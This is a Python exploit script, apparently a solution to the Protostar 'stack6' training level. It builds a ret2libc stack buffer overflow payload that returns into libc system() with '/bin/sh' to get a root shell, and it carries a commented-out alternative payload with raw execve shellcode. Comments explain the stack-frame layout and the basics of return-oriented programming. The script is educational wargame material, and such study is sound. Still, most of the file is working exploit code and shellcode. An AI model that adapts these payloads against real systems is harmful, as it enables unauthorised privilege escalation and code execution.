# Author	 : Abhinav Thakur
# E-Mail	 : compilepeace@gmail.com
# Platform	 : exploit-exercises/protostar/stack6
# ScriptName : exploit_stack6.py
#
# Usage 	 : While in protostar VM /home/ directory, type the bellow commands
#			   		$ python exploit_stack6.py > input_file
#			   		$ cat input_file - | /opt/protostar/bin/stack6
#					whoami
#					root
#

# If for example system() is called, then the stack frame constructed will contain-

#		|                       |
#		|   <__libc_system>     |
#		|     and its frame	|
#		|                       |
#		|-----------------------|
#		|                       |
#		|   return pointer to   |
#		|   next instruction    |
#		|   after the call to   |
#		|   <__libc_system>	|
#		|                       |
#		|-----------------------|
#		|                       |
#		|    argument to 	|
#		|     system()		|
#		|                       |		
#		^^^^^^^^^^^^^^^^^^^^^^^^^

# We can construct this frame manually, and that idea gives us power to do 
# more tricks. This acts as a base to Return Oriented Programming (ROP).



# address of ret instruction in  getpath() - 0x080484f9
# getpath()'s return pointer on stack at offset (from start of buffer): 80

# address of ret instruction in main() - 0x08048508,
# main()'s return pointer on stack at offset (from start of buffer): 96

# main()'s return address is '12 bytes' away from getpath()'s return address on stack.



import struct

offset = "A" * 80
																# overwriting return pointer of getpath()
ret_to_system = struct.pack("I", 0xb7ecffb0)  		            # return to <__libc_system>, (gdb)p system
ret_after_system = "XXXX"										# any arbitary address to return to after system()
system_argument = struct.pack("I", 0xb7fb63bf)                  # store address of "/bin/sh" as argument


payload = offset + ret_to_system + ret_after_system + system_argument

print payload




#------------------------------------ THIS ALSO WORKED --------------------------------

# getpath's return address at 0xbffff7ac
# main's return address at 0xbffff7bc

#import struct

#offset = "A" * 76
#base_pointer_unchanged = struct.pack("I", 0xbffff7b8)	# keep the value at base pointer in 'getpath()' unchanged
#ret_to_main = struct.pack("I", 0x08048505)				# overwrite 4 bytes of return pointer with main()'s  stack frame (i.e. leave it unchanged)
#padding =  struct.pack("III", 0x08048520, 0x00000000, 0xbffff838) + struct.pack("I", 0xbffff7c0)
#nops = "\x90"*4
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


#payload = offset + base_pointer_unchanged + ret_to_main + padding + nops + shellcode

#print payload
#----------------------------------------------------------------------------------------
